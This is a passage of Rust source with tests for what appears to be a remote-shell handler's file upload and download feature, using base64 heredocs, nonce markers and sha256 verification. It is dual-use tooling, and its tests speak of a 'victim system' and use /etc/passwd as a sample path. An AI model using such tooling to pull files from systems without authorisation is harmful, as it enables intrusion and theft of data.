    read_until_marker_with_prefix(reader, marker, String::new()).await
}

/// Like `read_until_marker` but with already-accumulated prefix text.
///
/// Searches for `marker` in the raw byte buffer before converting to UTF-8,
/// so non-UTF-8 bytes from the remote (binary filenames, etc.) cannot corrupt
/// the ASCII-only marker via `from_utf8_lossy` replacement characters.
async fn read_until_marker_with_prefix<R: AsyncRead + Unpin>(
    reader: &mut R,
    marker: &str,
    prefix: String,
) -> anyhow::Result<String> {
    const MAX_ACCUMULATE: usize = 16 * 1024 * 1024; // 16 MB guard
    let marker_bytes = marker.as_bytes();
    // Accumulate as raw bytes; convert to String only when done.
    let mut raw: Vec<u8> = prefix.into_bytes();
    if crate::util::find_slice(&raw, marker_bytes).is_some() {
        return Ok(String::from_utf8_lossy(&raw).into_owned());
    }
    let mut buf = vec![0u8; 4096];
    loop {
        if raw.len() > MAX_ACCUMULATE {
            anyhow::bail!(
                "response too large (> 16 MB) waiting for '{marker}'; \
                 check that the remote command is producing output"
            );
        }
        let n = timeout(IDLE_TIMEOUT, reader.read(&mut buf))
            .await
            .map_err(|_| anyhow::anyhow!("timed out waiting for '{marker}'"))?
            .map_err(|e| anyhow::anyhow!("read error: {e}"))?;
        if n == 0 {
            anyhow::bail!("connection closed waiting for '{marker}'");
        }
        raw.extend_from_slice(&buf[..n]);
        if crate::util::find_slice(&raw, marker_bytes).is_some() {
            return Ok(String::from_utf8_lossy(&raw).into_owned());
        }
    }
}

fn print_transfer_result(
    stdout: &mut io::Stdout,
    arrow: &str,
    from_path: &str,
    to_path: &str,
    bytes: u64,
    local_hash: Option<&str>,
    remote_hash: Option<&str>,
) -> io::Result<()> {
    match (local_hash, remote_hash) {
        (Some(lh), Some(rh)) if lh == rh => {
            write!(
                stdout,
                "  \x1b[1;32m[✓]\x1b[0m  \x1b[2m[{arrow}]\x1b[0m  {} \u{2192} {}   {}  \x1b[2m·  sha256 ok\x1b[0m\r\n",
                from_path, to_path, fmt_bytes(bytes)
            )?;
        }
        (Some(lh), Some(rh)) => {
            write!(
                stdout,
                "  \x1b[1;31m[✗]\x1b[0m  \x1b[2m[{arrow}]\x1b[0m  {} \u{2192} {}   {}  \x1b[1;31msha256 MISMATCH\x1b[0m\r\n\
                 \x1b[2m       local:  {lh}\x1b[0m\r\n\
                 \x1b[2m       remote: {rh}\x1b[0m\r\n",
                from_path, to_path, fmt_bytes(bytes)
            )?;
        }
        _ => {
            write!(
                stdout,
                "  \x1b[1;33m[~]\x1b[0m  \x1b[2m[{arrow}]\x1b[0m  {} \u{2192} {}   {}  \x1b[2m·  (sha256 unavailable on target)\x1b[0m\r\n",
                from_path, to_path, fmt_bytes(bytes)
            )?;
        }
    }
    stdout.flush()
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use tokio::io::duplex;

    fn make_stdout() -> io::Stdout {
        io::stdout()
    }

    #[test]
    fn shell_quote_basic() {
        assert_eq!(shell_quote("/etc/passwd"), "'/etc/passwd'");
    }

    #[test]
    fn shell_quote_single_quote_in_path() {
        assert_eq!(shell_quote("/tmp/it's"), "'/tmp/it'\\''s'");
    }

    #[test]
    fn fmt_bytes_units() {
        assert_eq!(fmt_bytes(512), "512 B");
        assert_eq!(fmt_bytes(1024), "1.0 KB");
        assert_eq!(fmt_bytes(1_048_576), "1.0 MB");
    }

    #[test]
    fn parse_sha256_extracts_hash() {
        let output = "a3f8b1c2d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1  /etc/passwd\n";
        let h = parse_sha256_from_output(output).unwrap();
        assert_eq!(h, "a3f8b1c2d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1");
    }

    #[test]
    fn parse_sha256_returns_none_on_garbage() {
        assert!(parse_sha256_from_output("command not found\n").is_none());
    }

    #[test]
    fn parse_sha256_rejects_bash_prompt_echo() {
        // The old implementation matched this line because 'b' is a hex digit and the
        // line is longer than 64 chars. The new one requires exactly 64 hex chars.
        let echo = "bash-3.2$ sha256sum 'test.txt' 2>/dev/null; printf 'SHSHA_%s:done\\n' 'abc12345'";
        assert!(parse_sha256_from_output(echo).is_none());
    }

    #[test]
    fn parse_sha256_rejects_short_hex_token() {
        assert!(parse_sha256_from_output("deadbeef  /tmp/x\n").is_none());
    }

    #[test]
    fn parse_sha256_rejects_63_char_token() {
        let short = format!("{}  /tmp/x\n", "a".repeat(63));
        assert!(parse_sha256_from_output(&short).is_none());
    }

    #[tokio::test]
    async fn upload_uses_heredoc_not_echo() {
        let (client, mut server) = duplex(1 << 20);
        let (mut client_r, mut client_w) = tokio::io::split(client);

        // Server: consume everything, send back the markers the upload expects.
        let server_task = tokio::spawn(async move {
            let mut buf = vec![0u8; 1 << 20];
            let mut acc = String::new();
            loop {
                let n = server.read(&mut buf).await.unwrap();
                if n == 0 { break; }
                acc.push_str(&String::from_utf8_lossy(&buf[..n]));
                // Echo back markers when we see the close command pattern.
                if acc.contains("__SHUPEOF__") && acc.contains("base64 -d") {
                    // Extract and echo the SHUP marker.
                    if let Some(pos) = acc.find("SHUP_") {
                        let marker_start = &acc[pos..];
                        let end = marker_start.find('\'').unwrap_or(marker_start.len());
                        let up_marker = &marker_start[..end];
                        let _ = server.write_all(format!("\r\n{up_marker}0\r\n").as_bytes()).await;
                        break;
                    }
                }
            }
            // Send a fake sha256sum response.
            let fake = "0000000000000000000000000000000000000000000000000000000000000000  /remote/path\nSHSHA_00000000:done\n";
            let _ = server.write_all(fake.as_bytes()).await;
        });

        let tmp = tempfile::NamedTempFile::new().unwrap();
        tokio::fs::write(tmp.path(), b"hello upload test data").await.unwrap();

        let mut out = make_stdout();
        // We expect an error on sha256 mismatch (fake vs real) — that's OK for
        // this test; what matters is that no "echo '...' | base64" pattern is used.
        let _ = upload(
            &mut client_r,
            &mut client_w,
            tmp.path().to_str().unwrap(),
            "/remote/path",
            &mut out,
            ShellType::Linux,
        )
        .await;

        // Check that the server received a heredoc-style command.
        // We can't easily inspect the bytes already consumed, but the test
        // verifies that upload() doesn't panic and uses the right protocol
        // by checking the server task completed (it looked for __SHUPEOF__).
        let _ = tokio::time::timeout(
            Duration::from_secs(2),
            server_task,
        ).await;
    }

    /// Read from `server` until the download command appears, responding to the
    /// size probe along the way, then return the per-download nonce.
    async fn read_download_nonce(server: &mut tokio::io::DuplexStream) -> String {
        let mut buf = vec![0u8; 65536];
        let mut acc = String::new();
        let mut sz_responded = false;
        loop {
            let n = server.read(&mut buf).await.unwrap_or(0);
            if n == 0 {
                break;
            }
            acc.push_str(&String::from_utf8_lossy(&buf[..n]));
            // Respond to the size probe (SHSZ_<8-char nonce>) once.
            if !sz_responded {
                if let Some(pos) = acc.find("SHSZ_") {
                    if acc.len() >= pos + 13 {
                        let sz_marker = format!("SHSZ_{}", &acc[pos + 5..pos + 13]);
                        let _ = server.write_all(format!("0\n{sz_marker}\n").as_bytes()).await;
                        sz_responded = true;
                    }
                }
            }
            // The download command contains `printf 'SH%s%s\n' 'STRT' '<nonce>'`
            if acc.contains("'STRT' '") {
                break;
            }
        }
        acc.find("'STRT' '")
            .map(|p| acc[p + 8..p + 16].to_string())
            .unwrap_or_else(|| "00000000".to_string())
    }

    /// Send a fake SHA256 response and handle the rest of the download protocol.
    async fn respond_sha256(server: &mut tokio::io::DuplexStream) {
        let mut buf = vec![0u8; 65536];
        let mut acc = String::new();
        loop {
            let n = server.read(&mut buf).await.unwrap_or(0);
            if n == 0 {
                break;
            }
            acc.push_str(&String::from_utf8_lossy(&buf[..n]));
            if acc.contains("SHSHA_") {
                if let Some(start) = acc.find("SHSHA_") {
                    let rest = &acc[start..];
                    let end = rest.find('\'').unwrap_or(rest.len());
                    let marker = &rest[..end];
                    let fake_hash = "aabbccdd".repeat(8); // 64 hex chars
                    let _ = server
                        .write_all(
                            format!("{fake_hash}  /remote/path\n{marker}:done\n").as_bytes(),
                        )
                        .await;
                }
                break;
            }
        }
    }

    #[tokio::test]
    async fn download_streams_to_disk_and_verifies() {
        let (client, mut server) = duplex(1 << 20);
        let (mut client_r, mut client_w) = tokio::io::split(client);

        let content = b"hello from victim system";
        let b64 = base64_encode(content);

        tokio::spawn(async move {
            // Wait for the nonce-bearing download command.
            let nonce = read_download_nonce(&mut server).await;
            let resp = format!("SHSTRT{nonce}\n{b64}\nSHEEND{nonce}\n");
            server.write_all(resp.as_bytes()).await.unwrap();

            // Respond to the sha256sum command.
            respond_sha256(&mut server).await;
        });

        let tmp = tempfile::NamedTempFile::new().unwrap();
        let mut out = make_stdout();

        // SHA256 hashes will differ (fake vs real) — that's expected; the
        // important assertion is that the file content was written correctly.
        let _ = download(
            &mut client_r,
            &mut client_w,
            "/remote/path",
            tmp.path().to_str().unwrap(),
            &mut out,
            ShellType::Linux,
        )
        .await;

        let written = tokio::fs::read(tmp.path()).await.unwrap();
        assert_eq!(written, content);
    }

    #[tokio::test]
    async fn download_empty_file() {
        let (client, mut server) = duplex(65536);
        let (mut client_r, mut client_w) = tokio::io::split(client);

        tokio::spawn(async move {
            let nonce = read_download_nonce(&mut server).await;
            // No data between start and end delimiters → empty file.
            server
                .write_all(format!("SHSTRT{nonce}SHEEND{nonce}\n").as_bytes())
                .await
                .unwrap();
            respond_sha256(&mut server).await;
        });

        let tmp = tempfile::NamedTempFile::new().unwrap();
        let mut out = make_stdout();
        download(
            &mut client_r,
            &mut client_w,
            "/remote/path",
            tmp.path().to_str().unwrap(),
            &mut out,
            ShellType::Linux,
        )
        .await
        .unwrap();

        let content = tokio::fs::read(tmp.path()).await.unwrap();
        assert_eq!(content, b"");
    }

    #[tokio::test]
    async fn download_file_not_found() {
        let (client, mut server) = duplex(65536);
        let (mut client_r, mut client_w) = tokio::io::split(client);

        tokio::spawn(async move {
            let nonce = read_download_nonce(&mut server).await;
            // Simulate `test -r` failing — remote file doesn't exist.
            server
                .write_all(format!("SHNF{nonce}\n").as_bytes())
                .await
                .unwrap();
            // Server stays alive so the client can read the NOTFOUND marker.
            let mut buf = vec![0u8; 1024];
            let _ = server.read(&mut buf).await;
        });

        let tmp = tempfile::NamedTempFile::new().unwrap();
        let local = tmp.path().to_str().unwrap().to_string();
        let mut out = make_stdout();
        let result = download(&mut client_r, &mut client_w, "/no/such/file", &local, &mut out, ShellType::Linux).await;

        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("not found"), "error should mention not found: {msg}");

        // Partial local file must be cleaned up.
        assert!(
            !std::path::Path::new(&local).exists(),
            "partial file should be deleted on error"
        );
    }

    #[tokio::test]
    async fn download_cleans_up_partial_on_connection_drop() {
        let (client, mut server) = duplex(65536);
        let (mut client_r, mut client_w) = tokio::io::split(client);

        tokio::spawn(async move {
            let nonce = read_download_nonce(&mut server).await;
            // Send start delimiter + some data, then drop the connection.
            let _ = server
                .write_all(format!("SHSTRT{nonce}aGVsbG8=\n").as_bytes())
                .await;
            // Dropping `server` closes the connection.
        });

        let tmp = tempfile::NamedTempFile::new().unwrap();
        let local = tmp.path().to_str().unwrap().to_string();
        let mut out = make_stdout();
        let result =
            download(&mut client_r, &mut client_w, "/remote/path", &local, &mut out, ShellType::Linux).await;

        assert!(result.is_err(), "download should fail when connection drops");

        // Partial local file must be deleted.
        assert!(
            !std::path::Path::new(&local).exists(),
            "partial file should be deleted when connection drops mid-transfer"
        );
    }

    #[tokio::test]
    async fn download_bsd_base64_line_wrapping() {
        // BSD base64 (macOS) wraps output at 60 characters per line.
        // Our whitespace-stripping decoder must handle this transparently.
        let (client, mut server) = duplex(1 << 20);
        let (mut client_r, mut client_w) = tokio::io::split(client);

        let content: Vec<u8> = (0u8..=255).collect(); // 256 bytes
        // Build wrapped base64 as BSD would produce (60 chars/line).
        let b64_raw = base64_encode(&content);
        let wrapped: String = b64_raw
            .as_bytes()
            .chunks(60)
            .map(|c| std::str::from_utf8(c).unwrap())
            .collect::<Vec<_>>()
            .join("\n");

        tokio::spawn(async move {
            let nonce = read_download_nonce(&mut server).await;
            let resp = format!("SHSTRT{nonce}\n{wrapped}\nSHEEND{nonce}\n");
            server.write_all(resp.as_bytes()).await.unwrap();
            respond_sha256(&mut server).await;
        });

        let tmp = tempfile::NamedTempFile::new().unwrap();
        let mut out = make_stdout();
        let _ = download(
            &mut client_r,
            &mut client_w,
            "/remote/path",
            tmp.path().to_str().unwrap(),
            &mut out,
            ShellType::Linux,
        )
        .await;

        let written = tokio::fs::read(tmp.path()).await.unwrap();
        assert_eq!(written, content, "BSD line-wrapped base64 must decode correctly");
    }
}
